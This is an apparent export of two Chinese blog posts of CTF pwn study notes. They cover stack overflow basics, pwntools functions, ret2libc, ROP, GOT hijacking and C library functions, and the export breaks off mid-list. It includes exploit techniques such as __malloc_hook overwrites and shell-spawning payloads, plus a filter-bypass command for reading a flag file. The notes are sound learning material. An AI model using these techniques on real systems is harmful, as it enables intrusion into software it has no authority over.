    <title>栈溢出--解题二三事</title>
    <url>/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<p>1、在python中如 \x62，表示一个占一个字节的十六进制数</p>
<p>2、大多数程序是小端顺序，就是说输入一个数据，如果是分开输入时（比如要一个字节，一个字节的按字节分开进行输入十六进制的数，而他们本身合起来是一个具体的数，那么此时输入进去，就需要把小的值放在前面先写，大的值放后面）；而大端顺序则是大的值写前面，与平常一样的顺序写</p>
<p>因为小端顺序，就是需要从低地址往高地址填充数据，所以先输入的是会放在低地址的数，后输入的才是高地址的数</p>
<p>在Linux中LSB文件为小端顺序，MSB为大端顺序，</p>
<p>3、IDA</p>
<p>（1）F5进行反汇编</p>
<p>（2）ida 中按下F12+SHIFT，可以查看string windows，查看一些关键字符串信息</p>
<p>（3）Alt+b可以进行搜索字符串</p>
<p>（4）在反汇编窗口中，点击函数按下X，可以查看交叉引用</p>
<p>（5）TAB键可以切换汇编与伪代码</p>
<p>（6）**;** 键可以为当前指令添加全文交叉引用的注释 </p>
<p>（7）n可以定义或修改名称，通常用来标注函数名 </p>
<p>（8）g可以跳转到任意地址 </p>
<p>（9）Esc可以返回到跳转前的位置 </p>
<p>（10）D可以分别按字节、字、双字显示数据 </p>
<p>（11）A可以按 ASCII 显示数据 </p>
<p>（12）/为伪C代码添加注释</p>
<p>ida的伪代码含义：</p>
<p>sub_ 指令和子函数起点</p>
<p>locret_ 返回指令 </p>
<p>loc_ 指令</p>
<p>off_ 数据，包含偏移量</p>
<p>seg_ 数据，包含段地址值</p>
<p>asc_ 数据，ASCII字符串</p>
<p>byte_ 数据，字节（或字节数组）</p>
<p>word_ 数据，16位数据（或字数组）</p>
<p>dword_ 数据，32位数据（或双字数组）</p>
<p>qword_ 数据，64位数据（或4字数组）</p>
<p>flt_ 浮点数据，32位（或浮点数组）</p>
<p>dbl_ 浮点数，64位（或双精度数组）</p>
<p>tbyte_ 浮点数，80位（或扩展精度浮点数）</p>
<p>stru_ 结构体(或结构体数组)</p>
<p>algn_ 对齐指示</p>
<p>unk_ 未处理字节</p>
<p>4、利用字符串程序输入溢出数据造成栈溢出的时候不要包含\x00（也就是所谓的空字符’\0’），否则向程序传入溢出数据时会造成截断</p>
<p>5、遇到不确定的地址时而最后地址的末端是我们需要到的shell的起始地址，可以填入\x90，对应的机器码指令是NOP(No Operation)，让CPU什么都不做，跳转到下一条命令，但是这个应用的前提是该处代码具有可执行性</p>
<p>6、在一起定义的两个全局变量，在内存的中位置是相邻的。如果一个全局变量被破坏了，不妨先查查其前后相关变量的访问代码，看看是否存在越界访问的可能。</p>
<p>7、有一个有意思的东西：在有的pwn题目中，我可以很正常的使用recvuntil()或者sendlineafter()去接收字符串，然而有的却不行；有的题目可以不用接收字符串直接输入payload（一开始认为是因为程序是在自己运行，刚好溢出点又在第一次输入的地方，所以可以），然而却碰到有些却要我接收信息才可以进行payload的输入</p>
<p>8、遇到一个对齐的问题：关于使用system函数进行跳转出现报错的原因</p>
<p>9、劫持栈帧到.bss段上时，要注意一下是否可能会将.got.plt表覆盖，导致程序无法正常执行</p>
<p>10、承接第4点吧，我们避免输入\x00导致程序截断，同时也要注意程序是否自身有着\x00，导致了截断</p>
<p>11、遇到strcat、strcpy、strcmp、strlen等函数的阻碍时，由于这些函数遇到’\0’将会停止，那么只要将其中的某个变量的第一个字符设为’\0’即可快速简单的绕过这些函数</p>
<p>12、当用puts函数泄露got表的地址，使用u64解包时，由于u64解包的条件是需要字符串的长度为8个字节，而地址的长度顶多6个字节那么长（高地址填充0，但是我们并不能接收到），此时就需要使用这样的形式进行接收：<strong>u64(p.recv(6).ljust(8,’\0’))</strong>  （’\0’写成’\x00’也行，毕竟在内存中存储情况是一样的）</p>
<p>13、一个大多数人应该都有错误的认知：认为溢出只要到如gets函数就能实现溢出了，所以下面的代码就不用看，这是绝对错误的！首先，我们通过栈溢出改变的只是返回地址的内容，想要到达返回地址，整个的函数执行流必须进行完，才会发生退栈，从而利用返回地址，所以下方的代码也要处理</p>
<p>14、执行strcmp、strncmp、strcasecmp的时候，rdx会被设置为将要被比较的字符串的长度</p>
<p>15、system的参数不一定是要/bin/sh才可以，只有sh也是可以的。而且sh可以从fflush()这个函数中获取，直接查找ida或者ROPgadget –binary 文件名 –string ‘sh’查询（不一定都能成功）</p>
<p>16、当远程docker过滤空格和cat时，将无法使用cat flag获取到flag，此时我们可以用<strong>more&lt;flag或者base64&lt;flag</strong>获取flag，其中的&lt;可以代替空格的功能，第一个<strong>more&lt;flag</strong> 与cat一样都是输出文件内容，而base64是把flag的内容转换成base64编码</p>
<p>17、64位的文件有时候不一定会存在rbp的调用，不存在leave指令，这时候我们只需要去关注rsp的位置即可，因为ret指令代表着pop rip，把栈顶的内容弹出给rip，所以锁定rsp的位置，就可以劫持rip</p>
<p>18、有时候在我们输入时，无法通过recvuntil去卡到输入的点，可以使用sleep()函数，让线程休眠，让对面的程序跑到我们要到点，再进行输入，方可利用成功（个人猜测）</p>
<p>19、64位下的linux的系统调用号（使用syscall调用，调用号是保存到rax中）：</p>
<p><strong>0(0x0) sys_read</strong></p>
<p><strong>1(0x1) sys_write</strong></p>
<p><strong>2(0x2)sys_open</strong></p>
<p><strong>3(0x3)sys_close</strong></p>
<p><strong>9(0x9)sys_mmap</strong></p>
<p><strong>37(0x25)sys_alarm</strong></p>
<p><strong>15(0xF) sys_rt_sigreturn</strong></p>
<p><strong>59(0x3B) sys_execve</strong></p>
<p><strong>60(0x3C)sys_exit</strong></p>
<p><strong>62(0x3E)sys_kill</strong></p>
<p>32位下linux系统调用号（使用syscall，调用号保存在eax中），函数其他参数依次存入ebx，ecx，edx中</p>
<p><strong>3(0x3)sys_read</strong></p>
<p><strong>4(0x4)sys_write</strong></p>
<p><strong>5(0x5)sys_open(文件名,0,0)</strong></p>
<p><strong>11(0xB) sys_execve</strong> </p>
<p>20、使用<strong>execve</strong>获取shell时，其参数要设置为<code>execve(&quot;/bin/sh&quot;,0,0)</code></p>
<p>21、劫持rip时，如果觉得在ida中的栈查看覆盖偏移量是对的，却没能获取shell时，去看看汇编代码，可能这时候出题人故意设置了返回代码不是平常的 leave  ret这两个，被修改为其他的代码了，导致退栈时候rsp指向地方的不是在rbp的下面，这时候我们要去gdb里面下断点在返回的指令前，查看rbp具体指向的地方</p>
<p>22、<strong>gdb 文件名 core</strong>可以调试程序中断而生成的核心转储文件，进行深入查看中断原因 </p>
<p>23、当题目已给出libc时，可以直接用libc显示出函数在其内的偏移地址，命令格式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">objdump -T ./libc-2.23.so | grep system #显示system的libc地址<br></code></pre></td></tr></table></figure>

<p><img src="/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/QQ%E5%9B%BE%E7%89%8720210510214657.png"></p>
<p>24、静态链接题目多半考虑ret2syscall，或者看有没有mprotect函数，修改段的执行权限，注入shellcode</p>
<p>25、libc中environ存储了栈上环境变量的特性，可以利用这个特效来泄露出栈上的地址，写为这样libc.sym[“environ”]</p>
<p>26、scanf读取过长的输入时会使用malloc_hook分配chunk，也就是可以借此如果能修改__malloc_hook为one_gadget的话，就能getshell</p>
<p>27、got表劫持：常见劫持put(buf)、free(buf)、atoi(buf)、atol(buf)</p>
<p>28、当scanf的参数不是%s时候，是u，d等数字，输入数字是使用str()即可，不用p64()。</p>
<p>因为输入数字是就是使用数字输入，如果使用了p64()将会变成字符数字</p>
<p>29、使用execv(“/bin/sh”,0)getshell需要两个参数</p>
<p>另外：2.29之后的libc直接调用system会出问题</p>
]]></content>
  </entry>
  <entry>
    <title>初入PWN</title>
    <url>/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/</url>
    <content><![CDATA[<p>前提工具配置：</p>
<p>（1）Linux系统虚拟机：配置python2.7 、安装pwntools的pwn模块、安装gdb、安装pip（其他的工具在做题遇到时再去安装）</p>
<p>（2）本机IDA pro静态调试器和Ollydbg动态调式器（两个都要有32bit以及64bit的版本）</p>
<p>语法要求：</p>
<p>（1）汇编语法</p>
<p>（2）c语言（c++最好也掌握，不过这比较少见）</p>
<p>（3）python</p>
<p>（4）java（后面的补充学习，新手没必要学）</p>
<p>工具使用要求：</p>
<p>（1）学会IDA的静态调试</p>
<p>（2）学会gdb的动态调试</p>
<p>（3）pwntools的使用</p>
<p>​    ·······</p>
<p>一、PWN模块中用到的函数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>send(data)</td>
<td>发送数据（字符串形式发送）</td>
</tr>
<tr>
<td>sendline(data)</td>
<td>发送一行数据，默认在行尾加 \n（字符串形式发送）</td>
</tr>
<tr>
<td>recv(numb=1096,timeout=default)</td>
<td>接收指定字节数的数据</td>
</tr>
<tr>
<td>recvuntil(delims,timeout=default)</td>
<td>接收数据直到 delims 出现</td>
</tr>
<tr>
<td>recvrepeat(timeout=default)</td>
<td>接收数据直到 EOF 或 timeout</td>
</tr>
<tr>
<td>recvall()</td>
<td>接收数据直到 EOF</td>
</tr>
<tr>
<td>recvline(keepends=True)</td>
<td>接收一行，可选择是否保留行尾的 \n</td>
</tr>
<tr>
<td>listen(端口)</td>
<td>开启一个本地的监听端口</td>
</tr>
<tr>
<td>remote(‘IP地址’, 端口)</td>
<td>与目标IP建立一个套接字管道与之远程交互（在线的）</td>
</tr>
<tr>
<td>interactive()</td>
<td>可同时读写管道，相当于回到 shell 模式进行交互，在取得 shell 之后调用</td>
</tr>
<tr>
<td>p8() p16()   p32()   p64()</td>
<td>把括号内数据打包成8位/6位/32位/64位的二进制数</td>
</tr>
<tr>
<td>u8() u16()  u32()   u64()</td>
<td>把括号内字符串解包成二进制数</td>
</tr>
<tr>
<td>process(‘文件路径’)</td>
<td>与本地文件建立一个交互通道</td>
</tr>
<tr>
<td>sendlineafter(“string”,payload)</td>
<td>接收到string后发送payload</td>
</tr>
<tr>
<td>close()</td>
<td>关闭交互的通道</td>
</tr>
<tr>
<td>ELF(‘文件路径’)</td>
<td>获取文件对象或者libc库对象</td>
</tr>
<tr>
<td>plt[‘函数名’]</td>
<td>获取函数在PLT表中的地址</td>
</tr>
<tr>
<td>got[‘函数名’]</td>
<td>获取函数在GOT表中的地址</td>
</tr>
<tr>
<td>symbols[‘函数名’]<br>或sym[‘函数名’]</td>
<td>获取函数plt地址，用在libc里面就是获取libc里的偏移地址</td>
</tr>
<tr>
<td>asm(“汇编指令”)</td>
<td>把汇编指令转换成对应的机器码，机器码是以字符串形式返回</td>
</tr>
<tr>
<td>bss(offset)</td>
<td>返回 .bss 段加上 offset 后的地址</td>
</tr>
<tr>
<td>asm(shellcraft.amd64.linux.sh()，arch=’amd64’)（这里是指明x64环境，如果已经有context设置环境就直接写为asm(shellcraft.sh())）</td>
<td>生成shellcode,一般与asm进行联用，转为对应机器码</td>
</tr>
<tr>
<td>context(arch=’amd64’或‘i386’,os=’linux’,log_level=’debug’)</td>
<td>设置环境</td>
</tr>
<tr>
<td>gdb.attach(p,’b* main’)</td>
<td>调动gdb进行脚本调式</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="一、x86架构下的栈溢出"><a href="#一、x86架构下的栈溢出" class="headerlink" title="一、x86架构下的栈溢出"></a>一、x86架构下的栈溢出</h3><p>栈区：简单来说就是c语言中创建的局部变量（例如函数花括号里的变量）的存储位置。内存中的栈区指的是系统栈，由系统自动维护。</p>
<p>栈在程序加载进内存后就会出现</p>
<p>入栈：每个函数都有一个属于自己的栈帧空间，最先压入栈内的是函数的返回地址（用来返回到下一条指令），之后是函数的基地址、参数入栈。例如主调函数在调用函数a时，主调函数先存入自身栈帧的为返回地址、自身基地址、传入函数a的实参（如果有的话），然后替函数a创建一个新栈帧，在新栈帧中先压入函数a的返回地址（为了函数调用结束时，可以返回到下一条指令继续程序），再压入主调函数的基地址（函数调用结束时，返回到主调函数的基地址）以及函数a中的局部变量。此时是高地址往低地址生长（主调函数在的位置为高地址）</p>
<p>退栈：而函数调用结束，则与调用时相反，先从被调函数的局部变量开始直接弹出栈，栈顶指向存储着被调函数基地址（存储主调函数基地址），被调函数基地址被弹出后，释放出主调函数的基地址给ebp，然后将返回地址弹出交给eip去执行，之后便返回到下一条指令的地址（这里举例为主调函数直接调用一个函数，如果层层嵌套，则先会返回到上一个主调函数的栈帧），继续程序的运行，ebp指向此刻的主调函数的基地址</p>
<p>系统中当前正在运行的函数总是在栈顶</p>
<p>与函数状态相关的主要寄存器：esp，ebp，eip：</p>
<p>（1）esp：栈指针寄存器，存放一个指针，该指针永远指向系统栈正在运行的栈帧的栈顶（存储函数调用栈的栈顶地址），在压栈和退栈时发生变化</p>
<p>（2）ebp：基地址指针寄存器，该指针永远指向系统栈正在运行的栈帧的底部，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置 </p>
<p>（3）在esp和ebp之间的内存空间为当前栈帧</p>
<p>（4）eip：用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令</p>
<p>因此，所谓的栈溢出漏洞，就是利用一些危险函数进行读取远超一个变量所需的数值，覆盖到相邻栈中的数值，从而修改相邻栈中的变量的值，往这些修改的值中注入我们所需要的跳转的例如shellcode，函数地址等，使程序崩坏或是让程序执行一些我们想要执行的程序，达到破坏的目的</p>
<p>x86下的CPU包含的8个四字节的通用寄存器：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/271639137915732.jpg"></p>
<p>寄存器使用约定：寄存器eax、edx和ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器ebx、esi和edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器ebp和esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p>
<h3 id="return-to-libc"><a href="#return-to-libc" class="headerlink" title="return to libc"></a><strong>return to libc</strong></h3><h4 id="——构造system-“-bin-sh“"><a href="#——构造system-“-bin-sh“" class="headerlink" title="——构造system(“/bin/sh“)"></a>——构造system(“/bin/sh“)</h4><p>使用前提：ASLR被关闭，内存中存在可达到目的的特定函数</p>
<p>system地址：<strong>在ASLR 被关闭的前提下</strong>，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态链接库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
<p>/bin/sh字符串地址：可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过getenv() 等函数来确定地址。</p>
<h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP ( Return Oriented Programming )"></a><strong>ROP ( Return Oriented Programming )</strong></h3><h4 id="——修改返回地址，让其指向内存中已有的一段指令"><a href="#——修改返回地址，让其指向内存中已有的一段指令" class="headerlink" title="——修改返回地址，让其指向内存中已有的一段指令"></a>——修改返回地址，让其指向内存中已有的一段指令</h4><p>利用一个及以上的gadget执行指令，最终调用能修改权限的函数，例如编号为125的函数mprotect()可修改栈的属性，从而利用shellcode。若是要连续使用多个gadget时一定要找含有ret指令的片段</p>
<p>被调用函数的编号应存入 eax，调用参数应按顺序存入 ebx，ecx，edx，esi，edi 中</p>
<p>那么如果要调用函数，就需要参数，而参数被存入在上方列举的寄存器中，那么此时我们要做的就是向寄存器存入我们需要的参数 ：</p>
<p>1）如果在内存中已经存在我们要的数据，可用mov指令来存入 </p>
<p>2）用pop指令来将栈顶数据弹入寄存器，pop 所传输的数据应该在 gadget 地址之后，如图：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/v2-07a48918aeb2f8b7dd2ddc4836a7b773_720w.png"></p>
<p>我们可以使用 push esp 这个gadget来执行shellcode</p>
<p>对于所有包含 pop 指令的 gadget，在其gadget地址之后都要添加 需要pop传入寄存器的数据，同时在所有 gadget 最后包含一段shellcode</p>
<p>如果利用 gadget 读取 ebp 的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了<strong>绕过内存随机化（ALSR）</strong>的可能。</p>
<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a><strong>Hijack GOT</strong></h3><h4 id="——修改某个被调用函数的地址，让其指向另外一个函数"><a href="#——修改某个被调用函数的地址，让其指向另外一个函数" class="headerlink" title="——修改某个被调用函数的地址，让其指向另外一个函数"></a>——修改某个被调用函数的地址，让其指向另外一个函数</h4><p>该方法是直接把函数修改成我们需要的函数，不再执行原来的函数，而不是上方执行某个函数后由返回地址进行跳转</p>
<p>函数在链接库中定位所用到的外部函数会用到GOT和PLT这两张表。GOT 全称是全局偏移量表（<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。PLT 全称是程序链接表（<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>able），用来存储外部函数的入口点（entry），换言之程序总会到 PLT 这里寻找外部函数的地址。PLT 存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改，所以 PLT 并不会知道程序运行时动态链接库被加载的确切位置。那么 PLT 表内存储的入口点是 GOT 表中对应条目的地址。</p>
<p>程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT  表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT  表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT  表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
<p>通过以上的介绍，那么实现修改函数的地方在于GOT表里的函数地址修改，让GOT执行的是我们需要的函数即可。既然这样，接下来需要做的工作是找到原函数的在GOT里的地址（GOT里函数的地址由PLT跳转，所以找PLT中函数的入口点）以及我们需要函数的地址，把我们需要的函数的地址替换到GOT</p>
<p>函数在动态链接库内的相对位置是<strong>固定的</strong>，在动态库打包生成时就已经确定。所以假如我们知道了某函数运行时地址（读取 GOT 表内容），也知道该函数和我们所需函数在动态链接库内的相对位置，就可以推算出函数的地址</p>
<p>最后在GOT中的替换修改，就需要用到上一个的ROP的方法实现</p>
<p>来源：</p>
<p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25892385">手把手教你栈溢出从入门到放弃（下）</a></p>
<h3 id="二、x64架构下的栈溢出"><a href="#二、x64架构下的栈溢出" class="headerlink" title="二、x64架构下的栈溢出"></a>二、x64架构下的栈溢出</h3><p>x64位下的十六个通用寄存器：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/register.png"></p>
<p>需要补充：在gcc下编译的才是把前六个参数依次放入rdi,rsi,rdx,rcx,r8,r9，而如果在VS编译环境下的只有前四个参数依次放入rcx,rdx,r8,r9</p>
<p>gcc编译环境：在通用寄存器中，函数执行前后必须保持原始的寄存器有3个：是rbx、rbp、rsp。rx寄存器中，最后4个必须保持原值：r12、r13、r14、r15。</p>
<p>保持原值的意义是为了让当前函数有可信任的寄存器，减小在函数调用过程中的保存&amp;恢复操作。除了rbp、rsp用于特定用途外，其余5个寄存器可随意使用。</p>
<p>通用寄存器中，不必假设保存值可随意使用的寄存器有5个：是rax、rcx、rdx、rdi、rsi。其中rax用于第一个返回寄存器（当 然也可以用于其它用途），rdx用于第二个返回寄存器（在调用函数时也用于第三个参数寄存器）</p>
<p>x86和x64下的创建栈帧的过程基本一致，就不再赘述了。</p>
<p>二者简单区别在于被调函数的参数的存储位置</p>
<ul>
<li>x86<ul>
<li>存储在主调函数的栈帧中，在函数返回地址的上方</li>
</ul>
</li>
<li>x64<ul>
<li>函数的前六个整型或指针参数依次保存在RDI,RSI,RDX,RCX,R8,R9中，如果还有更多的参数的话才会保存在栈上</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常</li>
<li>栈按照16字节对齐（就是说栈的大小是16的倍数）</li>
</ul>
</li>
</ul>
<p>来源于 CTF-wiki </p>
<p>栈溢出危险函数：</p>
<p>（1）输入</p>
<ul>
<li>gets 读取一行，忽略\x00（’\0’）</li>
<li>scanf</li>
<li>vscanf</li>
<li>read</li>
</ul>
<p>（2）输出</p>
<ul>
<li>sprintf</li>
</ul>
<p>（3）字符串函数</p>
<ul>
<li>strcat 字符串拼接，遇到\x00（’\0’）停止</li>
<li>strcpy 字符串复制，遇到\x00（’\0’）停止</li>
<li>bcopy</li>
</ul>
<hr>
<p>补充（一些我不懂的知识点）：</p>
<p>1、系统调用输入函数*<em>read(int fd, void <em>buf, size_t count)</em></em></p>
<p>size_t：表示无符号整数</p>
<p>ssize_t：表示有符号整数</p>
<p>（1）fd：将要读取数据的文件描述符；buf：所读取到的数据的内存缓冲；count：需要读取的数据量。</p>
<p>（2）fd为0时，表示为标准输入（键盘上获取输入），这时也是我们可以进行输入的时候；buf就是指一块存储空间，获取到的数据填入这里</p>
<p>（3）函数**write(int fd, void *buf, size_t count)**与之对应，是向buf缓存区写入一些数据，fd为1时表示为标准输出（显示在显示器上）</p>
<p>（4）fd=2时表示标准错误，这0，1，2是系统默认使用的，而3，4……等，可以由使用者自行决定</p>
<p>（5）成功<strong>返回读取的字节数</strong>，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0</p>
<p>2、<strong>atoi()</strong> 功能是把字符串转换成整数（int类型的），还有个相同功能的**atol()**是把字符串转换成长整型数（long类型的）</p>
<p>3、python发送数据的固定格式为：$(python -c “print ‘\xe8\x05\xd9\x1d’ + ‘\x01’*16’ “)(这里pwnable.kr col题作为一个例子，强调这里不用\x00是因为会阻断)</p>
<p>随机数问题中的函数：rand() ，srand()，time()</p>
<p>1、<strong>rand()<strong>原型为：</strong>int rand(void)</strong> 。rand() 用来产生随机数，但是，rand()的内部实现是用线性同余法实现的，是伪随机数，由于周期较长，因此在一定范围内可以看成是随机的</p>
<p>（1）**rand()**会返回一个范围在0到RAND_MAX（32767）之间的伪随机数（整数）</p>
<p>（2）使用rand()函数产生0-99以内的随机整数：int number1 = rand() % 100; (如果要生成1-100，在后面加1即可)</p>
<p>（3）如果没有设置随机数种子，rand()函数在调用时，自动设计随机数种子为1（相当于srand(1)的情况）。随机种子相同，每次产生的随机数也会相同。</p>
<p>2、time()：是C语言获取当前系统时间的函数，以秒作单位，代表当前时间自Unix标准时间戳(1970年1月1日0点0分0秒，GMT)经过了多少秒</p>
<p>（1）一般在随机数中，使用形式为time(0),获取正在变化的时间值，来配合srand()函数进行初始化函数发生器，生成不同的随机数</p>
<p>3、**srand()<strong>原型为：</strong>void srand (usigned int seed)**。用来设置rand()产生随机数时的随机数种子</p>
<p>（1）通常可以利用time(0)或geypid(0)的返回值作为seed</p>
<p>（2）使用srand()函数可以用来给rand()函数生成不一样的随机数种子</p>
<p>（3）使用rand()和srand()产生0-99以内的真正的随机整数:  srand(time(0));     int number1 = rand() % 100;</p>
<p>注：用time(0)作为随机数种子时，两次程序运行的时间间隔要超过一秒，否则两次运行得到的随机数将一致</p>
<p>4、**memcpy()**函数原型为 **void *memcpy(void <em>destin, void <em>source, unsigned n)</em></em> 功能为：从源source中拷贝n个字节到目标destin中，不会自动加上’\0’</p>
<p>5、**memset()<strong>原型为：</strong>void <em>memset(void <em>s, int ch, size_t n)</em></em>  功能为将s中当前位置后面的n个字节用 ch 替换并返回 s </p>
<p>注：这里用ch做符号，是因为该函数只能取ch的低八位数，取值范围为0~255，跟字符的取值一样</p>
<p>6、memcmp()函数原型为**int memcmp(const void *str1, const void *str2, size_t n)**功能为比较内存区域buf1和buf2的前n个字节，str1&gt;str2,返回正数；str1=str2返回0；str1&lt;str2返回负数，比大小时，一旦能确认大小则停止比较，直接返回数值</p>
<p>7、rax eax ax ah al分别是：64位、低32位、低16位、ax的高8位、ax的低8位</p>
<p>8、**strchr()<strong>函数原型为：</strong>char *strchr(const char *str, int c)**功能为在str所指向的字符串中搜索第一次出现ASCII码值为c的字符的位置，若存在则返回该字符的地址，否则返回NULL</p>
<p>9、violatile关键字通常用来修饰多线程共享的全局变量和IO内存。告诉编译器，不要把此类变量优化到寄存器中，每次都要老老实实的从内存中读取，因为它们随时都可能变化。</p>
<p>10、函数返回值是通过寄存器进行返回的。编译器使用eax作为存储返回值的寄存器，被调函数在ret前设置eax，返回后，主调函数从eax获取到该值。</p>
<p>11、**mprotect()<strong>函数原型为</strong>int mprotect(const void *start, size_t len, int prot)**功能为mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值（可读为4，可写为2，可执行为1）一般直接取7。</p>
<p>12、<strong>xxd</strong>命令可以查看文件的十六进制值，<strong>xxd 文件名 | tail</strong>可以打印十六进制值中的末尾数据。如果文件是被加上了upx压缩壳，可以输入<strong>upx -d</strong> 文件名 进行解压</p>
<p>13、**fflush(stdin)**是清空输入缓冲区的意思</p>
<p>14、<strong>malloc</strong>函数原型为为**void *malloc(unsigned int size)**；其作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。</p>
<p>分配成功则返回指向被分配内存的指针(此存储区中的初始值不确定)，否则返回空指针NULL。当动态内存不再使用时，应使用free()函数将内存块释放。</p>
<p>15、setvbuf原型 <strong>int setvbuf(FILE *stream, char *buf, int type, unsigned size)</strong> 用于设定文件流的缓冲区</p>
<p>type ： 期望缓冲区的类型：</p>
<p>_IOFBF(满缓冲）：当缓冲区为空时，从流读入数据。或者当缓冲区满时，向流写入数 据。</p>
<p>_IOLBF(行缓冲）：每次从流中读入一行数据或向流中写入一行数据。</p>
<p>_IONBF(无缓冲）：直接从流中读入数据或直接向流中写入数据，而没有缓冲区。</p>
<p>size ： 缓冲区内字节的数量。</p>
<p>成功执行返回0,否则返回非零值</p>
<p>16、**/dev/random<strong>和</strong>/dev/urandomLinux**是系统中提供的随机伪设备。这两个设备的任务，是提供永不为空的随机字节数据流 </p>
<p>用法：用open函数打开，然后从文件描述符中获取数据即可。</p>
<p>17、strcspn函数原型：**size_t strcspn(const char *s, const char * reject) **</p>
<p>功能：strcspn()从参数s 字符串的开头计算连续的字符，而这些字符都完全不在参数reject 所指的字符串中。简单地说， 若strcspn()返回的数值为n，则代表字符串s 开头连续有n 个字符都不含字符串reject 内的字符。</p>
<p>返回值为返回字符串s 开头连续不含字符串reject 内的字符数目。</p>
<p>18、回车 代码：CR ASCII码：/ r ，十六进制，0x0d，回车的作用只是移动光标至该行的起始位置；</p>
<p>换行 代码：LF ASCII码：/ n ，十六进制，0x0a，换行至下一行行首起始位置；</p>
<p>19、snprintf 函数原型**int snprintf(char <em>str, size_t size, const char <em>format, …)</em></em></p>
<p>功能：将可变个参数(…)按照format格式化成字符串，然后将其复制到str中。</p>
<p>(1) 如果格式化后的字符串长度 &lt; size，则将此字符串全部复制到str中，并给其后添加一个字符串结束符(‘\0’)；</p>
<p>(2) 如果格式化后的字符串长度 &gt;= size，则只将其中的(size-1)个字符复制到str中，并给其后添加一个字符串结束符(‘\0’)，返回值为欲写入的字符串长度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> a[<span class="hljs-number">16</span>];<br>  <span class="hljs-keyword">size_t</span> i;<br> <br>  i = <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-number">13</span>, <span class="hljs-string">&quot;%012d&quot;</span>, <span class="hljs-number">12345</span>);  <span class="hljs-comment">// 第 1 种情况</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %lu, a = %s\n&quot;</span>, i, a);    <span class="hljs-comment">// 输出：i = 12, a = 000000012345</span><br> <br>  i = <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;%012d&quot;</span>, <span class="hljs-number">12345</span>);   <span class="hljs-comment">// 第 2 种情况</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %lu, a = %s\n&quot;</span>, i, a);    <span class="hljs-comment">// 输出：i = 12, a = 00000001</span><br> <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>20、<strong>int execve(const char * filename,char * const argv[ ],char * const envp[ ])</strong></p>
